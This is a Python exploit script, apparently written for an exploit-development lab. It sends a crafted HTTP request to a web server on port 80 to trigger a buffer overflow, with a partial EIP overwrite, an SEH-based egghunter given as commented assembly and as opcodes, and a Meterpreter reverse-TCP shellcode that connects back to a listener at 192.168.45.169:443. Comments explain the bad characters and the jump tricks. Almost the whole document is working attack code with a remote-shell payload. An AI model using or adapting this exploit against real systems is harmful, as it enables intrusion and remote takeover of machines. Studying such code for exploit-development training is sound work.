#!/usr/bin/python

import socket
import sys
from struct import pack

try:
 server = sys.argv[1]
 # Stack layout
 port = 80
 size = 253 #size was 260, with 3 bytes left in buffer space, partial EIP offset at 253. Adjusted for partial EIP overwrite.
 
 # Executable is mapped in an addr range begins/contains a nullbyte.
 # We can use str null terminator at the end of our inputBuffer as part of our EIP overwrite.
 # This allows us to redirect execution flow to any ASM instruction we choose within the address range of the target executable.
 # In this context, we do this only overwriting the lower 3 bytes of the EIP register.

 # bad characters - "\x00\x0A\x0D\x20\x25"

 # changed httpMethod from GET to custom - better use of space, short jump of 0x17 opcode here (\xeb\x17) to hit our target buffer space for payload execution (more reliable). 
 # However, different memory allocation means different operations and checks performed on the operations stored by them which caused our input of short jump to be mangled (different set of bad characters here). 
 # Alternative used here is instead a conditional jump (use of arithmetic operations) on the ESP register and make it point to beginning of buffer. However, there may also be a different more trivial instruction.
 # Limited space in httpMethod below, however should be enough space within httpMethod for the aforementioned.
  
 #jmp if equal (JE) conditional jump, based on value of the ZF (zero flag) register = 1 (\x0F\x84\x11 = 0F8411000000), existing nullbyte completes the instruction.
 httpMethod = b"\x31\xC9" + b"\x85\xC9"  + b"\x0F\x84\x11" + b" /" # xor ecx, ecx ; test ecx, ecx; je 0x17


 # Previously, we observed that the original egghunter used the NtAccessCheckAndAuditAlaram function, because the system call number did not change until Windows 8. 
 # We fixed this by hardcoding the new system call number but this fix came at the cost of portability. We need a way to identify the version of the target operating system beforehand.
 # As an alternative, rather than relying on the operating system, we will create and install our own structured exception handler to handle accessing invalid memory pages because the underlying SEH mechanism has not changed drastically over various versions of Windows.
  
 """
        from keystone import *

        CODE = (
"	start: 									 "
		# jump to a negative call to dynamically 
		# obtain egghunter position
"		jmp get_seh_address 				;" 
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer 
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
		# subtract 0x04 from the pointer 
		# to exception_handler
"		sub ecx, 0x04 						;" 
		# add 0x04 to ebx
"		add ebx, 0x04 						;" 
		# overwrite the StackBase in the TEB
"		mov dword ptr fs:[ebx], ecx 		;" 
"	is_egg: 								 "
		# push 0x02
"		push 0x02 							;" 
		# pop the value into ecx which will act 
		# as a counter
"		pop ecx 							;" 
		# mov memory address into edi
"		mov edi, ebx 						;" 
		# check for our signature, if the page is invalid we 
		# trigger an exception and jump to our exception_handler function
"		repe scasd 							;" 
		# if we didn't find signature, increase ebx 
		# and repeat
"		jnz loop_inc_one 					;"  
		# we found our signature and will jump to it
"		jmp edi 							;" 
"	loop_inc_page: 							 " 
		# if page is invalid the exception_handler will 
		# update eip to point here and we move to next page
"		or bx, 0xfff 						;" 
"	loop_inc_one: 							 "
		# increase ebx by one byte
"		inc ebx 							;" 
		# check for signature again
"		jmp is_egg 							;" 
"	get_seh_address: 						 "
		# call to a higher address to avoid null bytes & push 
		# return to obtain egghunter position
"		call build_exception_record 		;" 
		# push 0x0c onto the stack
"		push 0x0c 							;" 
		# pop the value into ecx
"		pop ecx 							;" 
		# mov into eax the pointer to the CONTEXT 
		# structure for our exception
"		mov eax, [esp+ecx] 					;" 
		# mov 0xb8 into ecx which will act as an 
		# offset to the eip
"		mov cl, 0xb8						;" 
		# increase the value of eip by 0x06 in our CONTEXT 
		# so it points to the "or bx, 0xfff" instruction 
		# to increase the memory page
"		add dword ptr ds:[eax+ecx], 0x06	;" 
		# save return value into eax
"		pop eax 							;" 
		# increase esp to clean the stack for our call
"		add esp, 0x10 						;" 
		# push return value back into the stack
"		push eax 							;" 
		# null out eax to simulate 
		# ExceptionContinueExecution return
"		xor eax, eax 						;" 
		# return
"		ret 								;" 
)
 """

 # resulting egg hunter opcodes from above assembly (prepended with a NOP sled)
 egghunter = b"\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x2a\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"
 
 inputBuffer = b"\x41" * (size - len(egghunter))
 # lower 3 byte overwrite, ensures the terminating str null byte is within our EIP overwrite (00424242). Important not to append anything to the final buffer here, otherwise will replace the nullbyte of our partial EIP overwrite.
 inputBuffer += pack("<L", (0x418674)) # Partial EIP overwrite - 0x00418674 - pop eax; ret (lm m <executable> ; s -b 00400000 00452000 58 C3 (pop eax ; ret) instruction. Address chosen here doesn't contain any further nullbyte or badchars.
 httpEndRequest = b"\r\n\r\n"
 
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.169 LPORT=443 -f python -v payload 
 # secondary buffer bad chars = zero - no need to retract any bad chars.
 payload =  b""
 payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5"
 payload += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31"
 payload += b"\xff\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac"
 payload += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
 payload += b"\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c"
 payload += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
 payload += b"\x8b\x58\x20\x01\xd3\x50\x8b\x48\x18\x85\xc9"
 payload += b"\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31"
 payload += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
 payload += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
 payload += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
 payload += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
 payload += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
 payload += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
 payload += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
 payload += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
 payload += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
 payload += b"\x0a\x68\xc0\xa8\x2d\xa9\x68\x02\x00\x01\xbb"
 payload += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
 payload += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
 payload += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
 payload += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
 payload += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
 payload += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
 payload += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
 payload += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
 payload += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
 payload += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
 payload += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
 payload += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
 payload += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
 payload += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
 payload += b"\xff\xd5"

 shellcode = b"w00tw00t" + payload + b"\x44" * (400 - len(payload)) #theEgg

 buf = httpMethod + egghunter + inputBuffer + httpEndRequest + shellcode

 print("Sending evil buffer...")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((server, port))
 s.send(buf)
 s.close()

 print("Done!")

except socket.error:
    print("Could not connect!")
